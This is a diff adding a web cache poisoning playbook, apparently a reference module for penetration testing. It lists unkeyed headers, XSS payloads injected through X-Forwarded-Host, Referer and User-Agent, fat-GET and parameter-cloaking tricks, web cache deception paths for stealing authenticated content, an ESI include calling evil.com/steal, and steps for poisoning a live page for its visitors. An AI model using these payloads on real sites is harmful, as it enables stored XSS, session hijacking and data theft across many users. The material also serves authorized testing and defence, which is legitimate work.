@@ -1,0 +1,357 @@
+<cache_poisoning_guide>
+<title>WEB CACHE POISONING</title>
+
+<critical>Web cache poisoning exploits the gap between how caches key requests and how applications process them. By injecting malicious content into cached responses, attackers can serve exploits to many users, persist XSS, bypass authentication, and perform denial of service attacks.</critical>
+
+<scope>
+- CDN cache poisoning (Cloudflare, Akamai, Fastly, CloudFront)
+- Reverse proxy caches (Varnish, Nginx, Squid, Apache mod_cache)
+- Web cache deception (accessing cached sensitive data)
+- Application-level caching (Redis, Memcached stored responses)
+- Framework caching (Rails, Django, Laravel cache systems)
+</scope>
+
+<methodology>
+1. Identify cached endpoints through cache headers (X-Cache, Age, Via, CF-Cache-Status).
+2. Discover unkeyed inputs: headers, cookies, query parameters not included in cache key.
+3. Find reflections or behaviors influenced by unkeyed inputs.
+4. Craft payload that injects malicious content into cached response.
+5. Verify cache poisoning by accessing the resource without the malicious input.
+</methodology>
+
+<cache_detection>
+<cache_headers>
+{% raw %}
+# Common cache indicator headers
+X-Cache: HIT | MISS | BYPASS
+X-Cache-Hits: 5
+CF-Cache-Status: HIT | MISS | DYNAMIC | BYPASS  # Cloudflare
+X-Served-By: cache-lax17835-LAX                 # Fastly
+Age: 3600                                        # Time in cache (seconds)
+Via: 1.1 varnish, 1.1 cloudflare
+X-Varnish: 123456789 987654321                  # Varnish
+Cache-Control: public, max-age=86400
+ETag: "abc123"
+Last-Modified: Wed, 01 Jan 2024 00:00:00 GMT
+
+# Response varies based on these (should be in cache key)
+Vary: Accept-Encoding, Accept-Language, Cookie
+{% endraw %}
+</cache_headers>
+
+<cache_timing>
+{% raw %}
+# Compare response times
+# First request (cache miss): ~200ms
+# Second request (cache hit): ~20ms
+
+# Detect caching via timing difference
+curl -w "Total: %{time_total}s\n" -s -o /dev/null https://target.com/page
+{% endraw %}
+</cache_timing>
+</cache_detection>
+
+<unkeyed_inputs>
+<common_headers>
+{% raw %}
+# Headers often excluded from cache keys
+X-Forwarded-Host: evil.com
+X-Forwarded-Scheme: https
+X-Forwarded-Proto: http
+X-Original-URL: /admin
+X-Rewrite-URL: /admin
+X-Host: evil.com
+X-Forwarded-Server: evil.com
+X-HTTP-Host-Override: evil.com
+Forwarded: host=evil.com
+X-Original-Url: /different-path
+X-Custom-IP-Authorization: 127.0.0.1
+
+# Less common but potentially unkeyed
+X-Forwarded-Port: 443
+X-Forwarded-Prefix: /prefix
+True-Client-IP: 127.0.0.1
+X-Real-IP: 127.0.0.1
+CF-Connecting-IP: 127.0.0.1
+{% endraw %}
+</common_headers>
+
+<query_parameters>
+{% raw %}
+# Query parameter delimiter confusion
+/page?param=value&utm_source=poison      # Analytics params often unkeyed
+/page?param=value&callback=jsonp         # JSONP callbacks
+/page?param=value&_=1234567890           # Cache busters
+/page?param=value&debug=1                # Debug parameters
+/page;param=value                        # Semicolon delimiter (varies by cache)
+
+# Test cache key handling
+/page?a=1&b=2  vs  /page?b=2&a=1         # Parameter order
+/page?a=1&a=2                            # Duplicate parameters
+/page?a=1%26b=2                          # Encoded delimiters
+{% endraw %}
+</query_parameters>
+
+<other_inputs>
+{% raw %}
+# Cookies (sometimes excluded from cache key)
+Cookie: language=en; tracking=poisoned
+
+# Request body (GET with body)
+GET /page HTTP/1.1
+Host: target.com
+Content-Length: 20
+
+param=poisoned_value
+
+# HTTP method variations
+GET /api/data HTTP/1.1
+POST /api/data HTTP/1.1  # May share cache key
+{% endraw %}
+</other_inputs>
+</unkeyed_inputs>
+
+<attack_techniques>
+<host_header_injection>
+{% raw %}
+# X-Forwarded-Host poisoning
+GET /page HTTP/1.1
+Host: target.com
+X-Forwarded-Host: evil.com
+
+# If reflected in response (e.g., in absolute URLs):
+<script src="https://evil.com/js/app.js"></script>
+<link href="https://evil.com/css/style.css">
+<a href="https://evil.com/login">Login</a>
+
+# Multiple host headers
+Host: target.com
+Host: evil.com
+X-Forwarded-Host: evil.com
+X-Host: evil.com
+{% endraw %}
+</host_header_injection>
+
+<unkeyed_header_xss>
+{% raw %}
+# Find reflection of unkeyed header
+GET /page HTTP/1.1
+Host: target.com
+X-Forwarded-Host: target.com"><script>alert(1)</script>
+
+# Response becomes cached with:
+<link rel="canonical" href="https://target.com"><script>alert(1)</script>/page">
+
+# Other injection points
+X-Original-URL: /path"><script>alert(1)</script>
+Referer: "><script>alert(1)</script>
+User-Agent: "><script>alert(1)</script>  # If reflected and unkeyed
+{% endraw %}
+</unkeyed_header_xss>
+
+<fat_get_requests>
+{% raw %}
+# Fat GET: body in GET request processed but not keyed
+GET /page HTTP/1.1
+Host: target.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+param=<script>
+
+# Cache keys the URL but body is processed
+# Subsequent GET requests without body get poisoned response
+{% endraw %}
+</fat_get_requests>
+
+<parameter_cloaking>
+{% raw %}
+# Ruby/Rails parameter parsing quirks
+/page?param=value;poison=<script>alert(1)</script>
+
+# PHP parameter parsing
+/page?param=value&poison[]=<script>alert(1)</script>
+
+# URL encoding variations
+/page?param=value%26poison%3D<script>alert(1)</script>
+{% endraw %}
+</parameter_cloaking>
+
+<cache_key_normalization>
+{% raw %}
+# Exploit normalization differences
+/page?a=1    vs   /page?A=1           # Case sensitivity
+/page?a=1    vs   /page?a=1#fragment   # Fragment handling
+/page/?a=1   vs   /page?a=1            # Trailing slash
+/PAGE?a=1    vs   /page?a=1            # Path case
+/page%2f?a=1 vs   /page/?a=1           # Encoded path
+{% endraw %}
+</cache_key_normalization>
+</attack_techniques>
+
+<web_cache_deception>
+<path_confusion>
+{% raw %}
+# Trick cache into storing authenticated content
+# 1. User visits: https://target.com/account.css
+# 2. App serves /account (ignores .css extension)
+# 3. Cache stores as static .css file
+# 4. Attacker accesses cached /account.css to steal data
+
+# Common deception paths
+/my-account/nonexistent.css
+/api/user/data.js
+/dashboard/settings.png
+/profile/info.json
+
+# Path traversal variations
+/static/../api/user
+/images/../../admin/settings
+{% endraw %}
+</path_confusion>
+
+<content_type_confusion>
+{% raw %}
+# Rely on cache using file extension
+# While application uses Content-Type header
+
+GET /api/user/profile HTTP/1.1
+Host: target.com
+Accept: application/json
+
+# If attacker can manipulate path:
+/api/user/profile/anything.css
+/api/user/profile%2Fanything.css
+/api/user/profile;anything.css
+{% endraw %}
+</content_type_confusion>
+</web_cache_deception>
+
+<cdn_specific>
+<cloudflare>
+{% raw %}
+# Cloudflare cache status
+CF-Cache-Status: HIT | MISS | DYNAMIC | BYPASS | EXPIRED
+
+# Cache-Control respected
+# Page Rules can override caching behavior
+# Check for Transform Rules modifying headers
+{% endraw %}
+</cloudflare>
+
+<akamai>
+{% raw %}
+# Akamai cache headers
+X-Akamai-Transformed: 9 - 0 pmb=mTOE,1
+X-True-Cache-Key: /L/target.com/page cid=
+
+# Check for Edge Side Includes (ESI) injection
+<esi:include src="http://evil.com/steal"/>
+{% endraw %}
+</akamai>
+
+<fastly>
+{% raw %}
+# Fastly headers
+X-Served-By: cache-lax17835-LAX
+X-Cache: HIT, HIT
+
+# Surrogate-Control header
+Surrogate-Control: max-age=86400
+{% endraw %}
+</fastly>
+
+<varnish>
+{% raw %}
+# Varnish headers
+X-Varnish: 123456789 987654321
+Via: 1.1 varnish
+
+# Age header indicates time in cache
+Age: 3600
+{% endraw %}
+</varnish>
+</cdn_specific>
+
+<bypass_techniques>
+<vary_header_bypass>
+{% raw %}
+# If Vary header limits caching
+Vary: Accept-Encoding, Accept-Language
+
+# Match victim's headers to get cache hit
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
+# Or find endpoints without Vary header
+{% endraw %}
+</vary_header_bypass>
+
+<cache_buster_removal>
+{% raw %}
+# After poisoning, access without cache buster
+# Step 1: Poison with unique cache buster
+GET /page?cb=abc123 HTTP/1.1
+X-Forwarded-Host: evil.com
+
+# Step 2: Wait for cache to expire or be invalidated
+# Step 3: Poison again without cache buster
+GET /page HTTP/1.1
+X-Forwarded-Host: evil.com
+
+# Step 4: Victims access /page and get poisoned content
+{% endraw %}
+</cache_buster_removal>
+
+<internal_cache_poisoning>
+{% raw %}
+# Target application-level caches
+# Redis/Memcached response caching
+# Often use different cache keys than CDN
+
+# Look for X-Cache-Key headers revealing key structure
+X-Cache-Key: /example.com/page?param=value
+{% endraw %}
+</internal_cache_poisoning>
+</bypass_techniques>
+
+<validation>
+1. Demonstrate cache poisoning by showing HIT response to clean request.
+2. Prove unkeyed input by showing same cache key with different input values.
+3. Show malicious content served to requests without the payload.
+4. Document cache headers proving the poisoning persists.
+5. Provide timing evidence showing cached vs uncached response times.
+</validation>
+
+<false_positives>
+- Private caching (Cache-Control: private) only affects single user
+- Short TTL caches requiring constant re-poisoning
+- Vary header correctly including the exploited input
+- Dynamic/BYPASS responses not actually cached
+- Cache-Control: no-store preventing caching entirely
+</false_positives>
+
+<impact>
+- Stored XSS affecting all users accessing cached pages
+- Session hijacking via credential stealing payloads
+- Defacement and phishing through cached content modification
+- Denial of service by caching error responses
+- Data theft through web cache deception
+- Account takeover via cached authentication responses
+</impact>
+
+<pro_tips>
+1. Use Param Miner (Burp extension) to automate unkeyed input discovery.
+2. Always use cache busters during testing to avoid poisoning production.
+3. Test at different times; CDN behavior varies by region and load.
+4. Check multiple CDN edge locations; poisoning may be regional.
+5. Look for ESI injection in Akamai and Varnish environments.
+6. Monitor cache TTLs and test shortly before expiration.
+7. Web cache deception targets authenticated endpoints; test as logged-in user.
+8. Document cache infrastructure (CDN, proxy) for comprehensive testing.
+9. Check for cache poisoning in error pages and 404 responses.
+10. Use unique payloads per test to trace poisoning source.
+</pro_tips>
+
+<remember>Cache poisoning is about finding inputs that influence the response but don't influence the cache key. The gap between how caches key and how applications process creates opportunities for persistent attacks affecting many users.</remember>
+</cache_poisoning_guide>
